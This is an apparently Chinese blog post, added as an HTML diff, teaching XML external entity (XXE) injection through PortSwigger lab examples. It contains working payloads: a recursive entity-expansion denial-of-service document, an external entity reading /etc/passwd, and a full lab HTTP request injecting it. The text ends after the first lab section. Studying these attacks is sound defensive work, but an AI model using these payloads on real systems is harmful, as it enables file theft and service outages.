@@ -1,0 +1,1386 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="https://xz.aliyun.com/news/2994?time__1311=eqfxBQD%3DDQIxl6zq0%3DoGQditwP7Kp%2Box&amp;u_atoken=6ea3ed7a034f6a3fc07cf23413e029c3&amp;u_asig=1a0c399717420910296496960e0044\n1.XXE漏洞介绍 XXE漏洞原理 - FreeBuf网络安全行业门户\nXXE（XML External Entity）漏洞，即 XML 外部实体注入漏洞，是一种常见的 Web 安全漏洞\nXML（可扩展标记语言）在解析过程中，允许用户通过定义实体来引用外部资源。如果应用程序在处理 XML 数据时，没有对用户输入的 XML 内容进行严格的过滤和验证，攻击者就可以构造恶意的 XML 数据，通过定义恶意外部实体来访问本地文件系统、发起网络请求或执行其他恶意操作。\n">
+<title>XML外部实体注入漏洞</title>
+
+<link rel='canonical' href='https://lserein.github.io/p/xml%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/'>
+
+<link rel="stylesheet" href="/scss/style.min.946cca6c6259ef94ac55abfae7c7bf3291ea3ed5eea17ef77500b257217c6710.css"><meta property='og:title' content="XML外部实体注入漏洞">
+<meta property='og:description' content="https://xz.aliyun.com/news/2994?time__1311=eqfxBQD%3DDQIxl6zq0%3DoGQditwP7Kp%2Box&amp;u_atoken=6ea3ed7a034f6a3fc07cf23413e029c3&amp;u_asig=1a0c399717420910296496960e0044\n1.XXE漏洞介绍 XXE漏洞原理 - FreeBuf网络安全行业门户\nXXE（XML External Entity）漏洞，即 XML 外部实体注入漏洞，是一种常见的 Web 安全漏洞\nXML（可扩展标记语言）在解析过程中，允许用户通过定义实体来引用外部资源。如果应用程序在处理 XML 数据时，没有对用户输入的 XML 内容进行严格的过滤和验证，攻击者就可以构造恶意的 XML 数据，通过定义恶意外部实体来访问本地文件系统、发起网络请求或执行其他恶意操作。\n">
+<meta property='og:url' content='https://lserein.github.io/p/xml%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/'>
+<meta property='og:site_name' content='Lsec&#39;s Blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-06-22T21:40:00&#43;08:00'/><meta property='article:modified_time' content='2025-06-22T22:00:49&#43;08:00'/>
+<meta name="twitter:title" content="XML外部实体注入漏洞">
+<meta name="twitter:description" content="https://xz.aliyun.com/news/2994?time__1311=eqfxBQD%3DDQIxl6zq0%3DoGQditwP7Kp%2Box&amp;u_atoken=6ea3ed7a034f6a3fc07cf23413e029c3&amp;u_asig=1a0c399717420910296496960e0044\n1.XXE漏洞介绍 XXE漏洞原理 - FreeBuf网络安全行业门户\nXXE（XML External Entity）漏洞，即 XML 外部实体注入漏洞，是一种常见的 Web 安全漏洞\nXML（可扩展标记语言）在解析过程中，允许用户通过定义实体来引用外部资源。如果应用程序在处理 XML 数据时，没有对用户输入的 XML 内容进行严格的过滤和验证，攻击者就可以构造恶意的 XML 数据，通过定义恶意外部实体来访问本地文件系统、发起网络请求或执行其他恶意操作。\n">
+    <link rel="shortcut icon" href="/favicon.ico" />
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu_5a2f261f7f9cea8c.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🍥</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Lsec&#39;s Blog</a></h1>
+            <h2 class="site-description">欢迎来到Lsec的博客</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/Lserein/Lserein.github.io'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://x.com/secL15737016'
+                        target="_blank"
+                        title="Twitter"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%8F%8B%E9%93%BE/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>友链</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#1xxe漏洞介绍">1.XXE漏洞介绍</a></li>
+    <li><a href="#"><strong><font style="color:#000000;background-color:rgb(252, 252, 252);">2.XML基础知识</font></strong></a>
+      <ol>
+        <li><a href="#21内部实体"><font style="color:rgba(0, 0, 0, 0.9);background-color:rgb(252, 252, 252);">2.1.内部实体</font></a></li>
+        <li><a href="#22外部实体">2.2.外部实体</a></li>
+      </ol>
+    </li>
+    <li><a href="#3burp靶场xxe漏洞">3.Burp靶场XXE漏洞</a>
+      <ol>
+        <li><a href="#31利用-xxe-使用外部实体检索文件">3.1.利用 XXE 使用外部实体检索文件</a></li>
+        <li><a href="#32利用-xxe-执行-ssrf-攻击">3.2.利用 XXE 执行 SSRF 攻击</a></li>
+        <li><a href="#33具有带外交互的盲-xxe">3.3.具有带外交互的盲 XXE</a></li>
+        <li><a href="#34通过-xml-参数实体进行带外交互的盲-xxe">**3.4.**通过 XML 参数实体进行带外交互的盲 XXE</a></li>
+        <li><a href="#35利用盲-xxe-使用恶意外部-dtd-泄露数据">3.5.利用盲 XXE 使用恶意外部 DTD 泄露数据</a></li>
+        <li><a href="#36利用盲-xxe-通过错误消息检索数据">3.6.利用盲 XXE 通过错误消息检索数据</a></li>
+        <li><a href="#37利用-xinclude-检索文件">3.7.利用 XInclude 检索文件</a></li>
+        <li><a href="#38通过图像文件上传利用-xxesvg-xxe">3.8.通过图像文件上传利用 XXE&mdash;SVG XXE</a></li>
+        <li><a href="#39利用-xxe-通过重新利用本地-dtd-来检索数据">3.9.利用 XXE 通过重新利用本地 DTD 来检索数据</a></li>
+        <li><a href="#310利用xxe实现ddos漏洞">3.10.利用XXE实现DDOS漏洞</a></li>
+        <li><a href="#311通过utf-7编码利用xxe">3.11.通过UTF-7编码利用XXE</a></li>
+      </ol>
+    </li>
+    <li><a href="#4xxe漏洞危害">4.XXE漏洞危害</a></li>
+    <li><a href="#5xxe漏洞修复">5.XXE漏洞修复</a>
+      <ol>
+        <li><a href="#51禁用外部实体">5.1.禁用外部实体</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/xml%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">XML外部实体注入漏洞</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Jun 22, 2025</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 6 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <p><a class="link" href="https://xz.aliyun.com/news/2994?time__1311=eqfxBQD%3DDQIxl6zq0%3DoGQditwP7Kp%2Box&amp;u_atoken=6ea3ed7a034f6a3fc07cf23413e029c3&amp;u_asig=1a0c399717420910296496960e0044"  target="_blank" rel="noopener"
+    >https://xz.aliyun.com/news/2994?time__1311=eqfxBQD%3DDQIxl6zq0%3DoGQditwP7Kp%2Box&amp;u_atoken=6ea3ed7a034f6a3fc07cf23413e029c3&amp;u_asig=1a0c399717420910296496960e0044</a></p>
+<h2 id="1xxe漏洞介绍">1.XXE漏洞介绍
+</h2><p><a class="link" href="https://www.freebuf.com/vuls/263348.html"  target="_blank" rel="noopener"
+    >XXE漏洞原理 - FreeBuf网络安全行业门户</a></p>
+<p><strong><font style="color:rgba(0, 0, 0, 0.9);background-color:rgb(252, 252, 252);">XXE（XML External Entity）漏洞，即 XML 外部实体注入漏洞，是一种常见的 Web 安全漏洞<br>
+</font></strong><font style="color:#DF2A3F;background-color:rgb(252, 252, 252);">XML（可扩展标记语言）在解析过程中，允许用户通过定义实体来引用外部资源。如果应用程序在处理 XML 数据时，没有对用户输入的 XML 内容进行严格的过滤和验证，攻击者就可以构造恶意的 XML 数据，通过定义恶意外部实体来访问本地文件系统、发起网络请求或执行其他恶意操作。</font></p>
+<p><img src="/p/xml%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1.png"
+	width="1437"
+	height="495"
+	srcset="/p/xml%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1_hu_f4e714f3649d8052.png 480w, /p/xml%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1_hu_8a90fa467161bda0.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="290"
+		data-flex-basis="696px"
+	
+></p>
+<h2 id=""><strong><font style="color:#000000;background-color:rgb(252, 252, 252);">2.XML基础知识</font></strong>
+</h2><p><a class="link" href="https://www.cnblogs.com/lcamry/p/5736998.html"  target="_blank" rel="noopener"
+    >XML注入介绍&ndash;XXE，XEE,xpath等 - lcamry - 博客园</a></p>
+<p><strong><font style="color:rgba(0, 0, 0, 0.9);background-color:rgb(252, 252, 252);">XML（eXtensible Markup Language），即可扩展标记语言，是一种用于标记电子文件使其具有结构性标记的标记语言</font></strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>      ----文档声明
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;students&gt;</span>                                  ---根元素
+</span></span><span class="line"><span class="cl">  <span class="nt">&lt;student&gt;</span>                                 ---子元素
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;name&gt;</span>张三<span class="nt">&lt;/name&gt;</span>                       ---子元素属性和值
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;age&gt;</span>20<span class="nt">&lt;/age&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&lt;/student&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&lt;student&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;name&gt;</span>李四<span class="nt">&lt;/name&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;age&gt;</span>21<span class="nt">&lt;/age&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&lt;/student&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/students&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">XML 文档声明，在文档的第一行
+</span></span><span class="line"><span class="cl">XML 文档类型定义，即DTD，XXE 漏洞所在的地方
+</span></span><span class="line"><span class="cl">XML 文档元素
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><font style="color:rgba(0, 0, 0, 0.9);background-color:rgb(252, 252, 252);">XML 文档的第一行通常是文档声明，用于指定 XML 的版本和编码等信息，如 </font><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);&quot;&gt;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;/font&gt;</code><font style="color:rgba(0, 0, 0, 0.9);background-color:rgb(252, 252, 252);"> 。</font></p>
+<p><font style="color:rgba(0, 0, 0, 0.9);background-color:rgb(252, 252, 252);">每个 XML 文档必须有且只有一个根元素，它是整个文档的顶层元素，其他所有元素都嵌套在根元素内部。例如：</font><code>&lt;students&gt;</code><font style="color:rgba(0, 0, 0, 0.9);background-color:rgb(252, 252, 252);"> 是根元素，包含了多个 </font><code>&lt;student&gt;</code><font style="color:rgba(0, 0, 0, 0.9);background-color:rgb(252, 252, 252);"> 子元素。</font></p>
+<h3 id="21内部实体"><font style="color:rgba(0, 0, 0, 0.9);background-color:rgb(252, 252, 252);">2.1.内部实体</font>
+</h3><p><strong><font style="color:rgba(0, 0, 0, 0.9);background-color:rgb(252, 252, 252);">在正常使用且经过严格验证的场景下，内部实体通常是安全的。因为它们的值是固定的，在编写代码时就已经明确指定 ，不会从外部获取不可信的数据。</font></strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE root [
+</span></span></span><span class="line"><span class="cl"><span class="cp">    &lt;!ENTITY company &#34;阿里巴巴&#34;&gt;</span>
+</span></span><span class="line"><span class="cl">]&gt;
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;root&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;companyName&gt;</span><span class="ni">&amp;company;</span><span class="nt">&lt;/companyName&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/root&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>不安全的情况DDOS漏洞</strong></p>
+<p><strong><font style="color:rgba(0, 0, 0, 0.9);background-color:rgb(252, 252, 252);">如果应用程序在处理包含内部实体的 XML 数据时，没有对实体引用进行适当的限制和验证，攻击者可能通过构造特殊的内部实体来达到恶意目的。例如，攻击者可以利用内部实体进行递归解析攻击（也称为 XML 实体膨胀攻击），导致内存耗尽从而引发拒绝服务（DoS）攻击：</font></strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE lolz [
+</span></span></span><span class="line"><span class="cl"><span class="cp">    &lt;!ENTITY lol &#34;lol&#34;&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="cp">&lt;!ENTITY lol2 &#34;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&#34;&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="cp">&lt;!ENTITY lol3 &#34;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&#34;&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="c">&lt;!-- 以此类推，不断增加嵌套 --&gt;</span>
+</span></span><span class="line"><span class="cl">]&gt;
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;lolz&gt;</span><span class="ni">&amp;lol3;</span><span class="nt">&lt;/lolz&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="22外部实体">2.2.外部实体
+</h3><p><strong><font style="color:rgba(0, 0, 0, 0.9);background-color:rgb(252, 252, 252);">外部实体是指引用外部资源的实体，其值需要从外部文件系统、网络等位置获取。 </font></strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>            xml声明
+</span></span><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE foo [																xml文档类型定义，即dtd，xxe漏洞存在的地方
+</span></span></span><span class="line"><span class="cl"><span class="cp">    &lt;!ENTITY xxe SYSTEM &#34;file:///etc/passwd&#34;&gt;</span>
+</span></span><span class="line"><span class="cl">]&gt;
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;foo&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/foo&gt;</span>																	xml文档元素
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="3burp靶场xxe漏洞">3.Burp靶场XXE漏洞
+</h2><p><a class="link" href="https://mp.weixin.qq.com/s/a_AlnsHdyavDriFbnTsyRw"  target="_blank" rel="noopener"
+    >【Burp系列】超全XXE注入漏洞实验总结（建议收藏）</a></p>
+<p><strong>XXE漏洞&mdash;抓包得是XML格式数据包，否则大概率不存在此类型漏洞，现在大部分都是Json格式数据包</strong></p>
+<h3 id="31利用-xxe-使用外部实体检索文件">3.1.利用 XXE 使用外部实体检索文件
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl">POST /product/stock HTTP/2
+</span></span><span class="line"><span class="cl">Host: 0ab900e90317b03082b206b900d600d8.web-security-academy.net
+</span></span><span class="line"><span class="cl">Cookie: session=uZvFscQ1qEEYqbg9aO5p2I4LFojVnL3Y
+</span></span><span class="line"><span class="cl">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
+</span></span><span class="line"><span class="cl">Accept: */*
+</span></span><span class="line"><span class="cl">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+</span></span><span class="line"><span class="cl">Accept-Encoding: gzip, deflate, br
+</span></span><span class="line"><span class="cl">Referer: https://0ab900e90317b03082b206b900d600d8.web-security-academy.net/product?productId=2
+</span></span><span class="line"><span class="cl">Content-Type: application/xml
+</span></span><span class="line"><span class="cl">Content-Length: 195
+</span></span><span class="line"><span class="cl">Origin: https://0ab900e90317b03082b206b900d600d8.web-security-academy.net
+</span></span><span class="line"><span class="cl">Sec-Fetch-Dest: empty
+</span></span><span class="line"><span class="cl">Sec-Fetch-Mode: cors
+</span></span><span class="line"><span class="cl">Sec-Fetch-Site: same-origin
+</span></span><span class="line"><span class="cl">Priority: u=0
+</span></span><span class="line"><span class="cl">Te: trailers
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE foo [
+</span></span></span><span class="line"><span class="cl"><span class="cp">    &lt;!ENTITY productId SYSTEM &#34;file:///etc/passwd&#34;&gt;</span>
+</span></span><span class="line"><span class="cl">]&gt;
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;stockCheck&gt;&lt;productId&gt;</span><span class="ni">&amp;productId;</span><span class="nt">&lt;/productId&gt;&lt;storeId&gt;</span>1<span class="nt">&lt;/storeId&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/stockCheck&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
